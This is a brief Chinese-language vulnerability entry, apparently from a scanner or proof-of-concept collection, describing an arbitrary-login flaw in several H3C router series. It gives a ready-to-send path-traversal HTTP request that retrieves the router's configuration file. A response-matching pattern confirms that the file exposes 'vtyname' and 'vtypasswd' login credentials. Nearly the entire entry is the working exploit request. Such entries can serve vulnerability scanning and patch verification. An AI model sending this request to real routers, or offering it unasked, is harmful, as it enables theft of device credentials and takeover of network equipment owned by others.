# H3C多系列路由器存在任意用户登录漏洞

H3C ｜ 其他 ｜ —
- **请求**：`GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1`
- **响应特征**：200 ^(?=.*?vtyname)(?=.*?vtypasswd).*?$